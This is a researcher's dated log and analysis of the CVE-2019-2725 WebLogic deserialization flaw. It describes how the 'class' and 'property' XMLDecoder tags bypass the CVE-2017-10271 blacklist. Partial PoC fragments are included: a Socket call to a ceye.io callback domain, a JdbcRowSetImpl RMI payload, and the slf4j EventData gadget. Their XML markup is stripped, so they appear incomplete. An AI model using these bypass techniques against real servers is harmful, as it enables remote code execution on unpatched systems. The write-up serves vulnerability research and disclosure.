### Code Analysis and Vulnerability Overview

The provided code snippet checks for array length limitations and handles `NumberFormatException` exceptions. The relevant tags, such as `object`, `new`, and `method`, are filtered. The `void` tag can only be followed by `index`, and the `array` tag can be followed by a `class` attribute, but the type must be `byte`. The filtering of the `object` tag is a patch for CVE-2017-3506, while the other filters address CVE-2017-10271.

### Bypassing the Blacklist

The key to bypassing this blacklist is the `class` tag, which is not included in the WebLogic blacklist. This tag can be used to create an instance of any class, as documented in the [Oracle JavaBeans Tutorial](https://docs.oracle.com/javase/tutorial/javabeans/advanced/longpersistence.html). Oracle released a patch for this vulnerability on April 26, confirming the need to filter the `class` tag.

Since the vulnerability allows bypassing the blacklist for CVE-2017-10271, `wls-wsat.war` should also be affected. Testing this hypothesis is essential.

### Testing the Vulnerability

#### April 21, 2019

I constructed a PoC to test the vulnerability using the `class` tag to create an instance of the `java.net.Socket` class with JDK 6u45:

```java
java.net.Socket
aaaaabbbbbbbbbbb.wfanwb.ceye.io
80
```

[Ceye](http://ceye.io/) successfully received the request, indicating that the `Socket` instance was created. However, when testing the same PoC with JDK 7, it failed due to a `java.net.Socket not found` error. After careful comparison, it was determined that the issue was related to newline characters. The correct PoC should be:

```java
java.net.Socketaaaaabbbbbbbbbbb.wfanwb.ceye.io80
```

#### April 22, 2019

@pyn3rd tested WebLogic 12.1.3 and found that the `oracle.toplink.internal.sessions.UnitOfWorkChangeSet` class was missing, making the exploit unfeasible. I then tried to construct a new exploit using the `com.sun.rowset.JdbcRowSetImpl` class:

```java
rmi://localhost:1099/Exploit
true
```

This payload is one of the known CVE-2017-10271 payloads. Since the `void` tag can only be followed by `index`, this payload would be rejected by the blacklist. I attempted to rewrite the payload using the `class` tag.

During this process, I discovered that JDK 6 and JDK 7 handle tags differently:
- **JDK 6** uses `com.sun.beans.ObjectHandler` and supports tags like `string`, `class`, `null`, `void`, `array`, `java`, `object`, and some primitive types.
- **JDK 7** uses `com.sun.beans.decoder.DocumentHandler` and supports additional tags like `new` and `property`.

Using the `property` tag, which is not in the WebLogic blacklist, I successfully executed the command on both WebLogic 10.3.6 and 12.1.3. Unfortunately, this payload does not work with JDK 6 due to the lack of support for the `property` tag.

#### April 23, 2019

After major security companies issued vulnerability alerts, many fake PoCs appeared, claiming success without patches. Oracle's downloaded WebLogic is not patched, and the patch is a separate charge. If the CVE-2017-10271 patch is installed, these PoCs and exploits cannot bypass the blacklist.

#### April 26, 2019

Oracle officially released an emergency patch, identifying the vulnerability as **CVE-2019-2725**.

#### April 27, 2019

@pyn3rd researched the exploit for WebLogic 12.1.3 using the `org.slf4j.ext.EventData` class:

```java
public EventData(String xml) {
    ByteArrayInputStream bais = new ByteArrayInputStream(xml.getBytes());
    try {
        XMLDecoder decoder = new XMLDecoder(bais);
        this.eventData = (Map)decoder.readObject();
    } catch (Exception var4) {
        throw new EventException("Error decoding " + xml, var4);
    }
}
```

By constructing an instance of this class, `XMLDecoder.readObject` can be called again, bypassing the blacklist.

#### April 30, 2019

I observed other uses of this vulnerability without version restrictions for WebLogic and JDK. A demo video from Tenable demonstrated this exploitation, which can be referenced from the CVE-2017-17485 vulnerability.

### Summary

Oracle issued a rare out-of-band security update to address this vulnerability, still using a blacklist. During my research, I learned many new techniques and insights.
